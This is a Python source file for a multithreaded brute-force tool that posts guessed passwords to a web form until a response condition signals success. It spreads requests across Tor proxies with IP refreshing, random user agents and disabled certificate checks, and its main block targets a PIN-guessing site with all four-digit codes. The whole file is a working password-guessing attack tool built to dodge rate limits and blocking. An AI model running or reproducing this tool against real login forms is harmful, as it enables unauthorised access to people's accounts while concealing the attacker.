import logging
import requests
import colorama
import concurrent.futures
import time
import urllib3
import shutil
import queue

from dependincies import assign_new_ip

from fake_useragent import UserAgent


def get_header_with_random_user_agent():
    ua = UserAgent()
    headers = {
        'User-Agent': ua.random
    }

    return headers


# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Initiate_attack:
    def __init__(self, tor: bool, fields: dict, field_to_attack: str, website: str, condition: str, number_of_threads: int, passwords: list):
        self.tor = tor
        self.fields = fields
        self.field_to_attack = field_to_attack
        self.website = website
        self.condition = condition
        self.number_of_threads = number_of_threads
        self.passwords = passwords
        self.queues = [queue.Queue() for _ in range(number_of_threads+1)]
        self.requested = 0
        self.start_time = None
        self.run = True
        self.timeouts = 0
        self.timed_out_passwords = []

        # Initialize colorama styles
        self.BRIGHT = colorama.Style.BRIGHT
        self.RESET = colorama.Fore.RESET + colorama.Style.RESET_ALL + colorama.Back.RESET
        self.RED = colorama.Fore.RED
        self.BLUE = colorama.Fore.BLUE
        self.CYAN = colorama.Fore.CYAN
        self.WHITE = colorama.Fore.WHITE
        self.GREEN = colorama.Fore.GREEN

    def progress_bar(self, total_chunks, current_chunk, start_time):
        bar_length = shutil.get_terminal_size().columns - 30
        if total_chunks == 0:
            return
        percent_done = current_chunk / total_chunks
        filled_length = int(bar_length * percent_done)
        remaining_length = bar_length - filled_length
        elapsed_time = time.time() - start_time
        eta_seconds = (elapsed_time / percent_done) - elapsed_time if percent_done > 0 else 0
        eta_formatted = time.strftime("%H:%M:%S", time.gmtime(eta_seconds))
        progress_bar_str = f"{self.BRIGHT}[{'#' * filled_length}{'-' * remaining_length}] {percent_done *   100:.2f}% ETA: {eta_formatted}{self.RESET}"
        print(progress_bar_str, end='\r')

    def make_request(self, thread_number: int):
        self.start_time = time.time()
        fields = self.fields
        if self.tor:
            proxy = {'http': f'socks5h://127.0.0.1:{10000+thread_number}',
                     'https': f'socks5h://127.0.0.1:{10000+thread_number}'}
        else:
            proxy = None

        while self.run:
            try:
                password = self.queues[thread_number].get(timeout=1)
            except queue.Empty:
                # No more passwords to process, check if all threads are done
                if all(q.empty() for q in self.queues):
                    break
                continue

            fields[self.field_to_attack] = password


            try:
                response = requests.post(self.website, data=fields, proxies=proxy, timeout=10, verify=False, headers=get_header_with_random_user_agent())
                # response = requests.get(self.website, proxies=proxy, timeout=10, verify=False)
                # print(response.text)
                # open('website.html', 'w').write(response.text)
            except (requests.Timeout, requests.exceptions.ConnectionError, requests.exceptions.ConnectTimeout):
                self.timeouts += 1
                logging.debug(str(password) + 'Timed-out')
                self.timed_out_passwords.append(password)
                continue

            self.requested += 1
            if self.condition.startswith('u'):
                if self.condition[1:] not in response.text:
                    print()
                    logging.critical(f'{self.BRIGHT}{self.GREEN}[+] Got the correct fields since "{self.condition[1:]}" is not in the response: {fields}{self.RESET}')
                    self.run = False
                    break

            else:
                if self.condition[1:] in response.text:
                    print()
                    logging.critical(f'{self.BRIGHT}{self.GREEN}[+] Got the correct fields since "{self.condition[1:]}" is in the response: {fields}{self.RESET}')
                    self.run = False
                    break

            # Update the progress bar
            self.progress_bar(len(self.passwords), self.requested, self.start_time)

    def create_threads(self):
        for password in self.passwords:
            # Find the queue with the least work
            min_queue = min(self.queues, key=lambda q: q.qsize())
            min_queue.put(password)

        if self.tor:
            assign_new_ip.refresh_tor_ips()
        # self.make_request(self.number_of_threads)

        while True:
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.number_of_threads+1) as executor:
                _ = executor.map(self.make_request, range(self.number_of_threads+1))

                if self.timed_out_passwords:
                    logging.info(f'{self.BRIGHT}{self.CYAN}[!] Finished with the passwords however there are some passwords that could not have been requested because of timeouts retrying them{self.RESET}')
                    for password in self.timed_out_passwords:
                        min_queue = min(self.queues, key=lambda q: q.qsize())
                        min_queue.put(password)
                    self.timed_out_passwords = []
                    continue
                else:
                    break

        assign_new_ip.RUNNING = False



if __name__ == '__main__':
    attack = Initiate_attack(True, {'Guess': 'submit'}, 'guess', 'https://www.guessthepin.com/prg.php', 'sHoly', 20,
                             [i for i in range(1000, 10000)])

    try:
        attack.create_threads()
    except KeyboardInterrupt:
        attack.run = False
